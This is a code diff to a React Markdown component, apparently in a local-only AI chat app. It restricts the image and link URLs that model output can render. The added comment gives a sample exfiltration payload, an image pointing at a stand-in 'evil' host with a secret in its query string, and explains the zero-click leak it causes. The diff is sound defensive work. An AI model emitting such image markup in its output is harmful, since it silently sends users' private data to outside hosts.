@@ -20,12 +20,41 @@ function codeLanguage(className: string | undefined): string {
   return match?.[1] ?? '';
 }
 
+/**
+ * Which URLs a MODEL is allowed to put in front of the browser.
+ *
+ * Model output is untrusted. Rendering `![](https://evil/?d=SECRET)` makes the
+ * browser issue a GET the moment the message paints — no click, no consent —
+ * and React additionally emits a `<link rel="preload" as="image">`, so it
+ * fires even earlier. That is a zero-click exfiltration channel out of an app
+ * whose whole premise is that nothing leaves the device, and neither the web
+ * nor the mobile build ships a CSP that would stop it.
+ *
+ * So: images may only come from THIS origin or from bytes the app itself
+ * produced (`data:`, `blob:` — how an attachment the user added is rendered).
+ * Anything else is dropped rather than rewritten, because a broken image the
+ * user can see beats a silent request they cannot.
+ *
+ * Links keep `http(s)` — a link is a click the user makes deliberately, which
+ * is a different act from a fetch the page makes on their behalf — but
+ * `javascript:` and `data:` are refused there.
+ */
+const SAFE_IMAGE = /^(?:data:image\/|blob:|\/(?!\/))/i;
+const SAFE_LINK = /^(?:https?:\/\/|mailto:|#|\/(?!\/))/i;
+
+function safeUrl(url: string, kind: 'image' | 'link'): string {
+  const trimmed = url.trim();
+  const pattern = kind === 'image' ? SAFE_IMAGE : SAFE_LINK;
+  return pattern.test(trimmed) ? trimmed : '';
+}
+
 export const Markdown = memo(function Markdown({ text }: { text: string }): ReactNode {
   return (
     <div className="md">
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         rehypePlugins={[[rehypeHighlight, { detect: true, ignoreMissing: true }]]}
+        urlTransform={(url, key) => safeUrl(url, key === 'src' ? 'image' : 'link')}
         components={{
           pre({ children }) {
             return <CodeBlock>{children}</CodeBlock>;
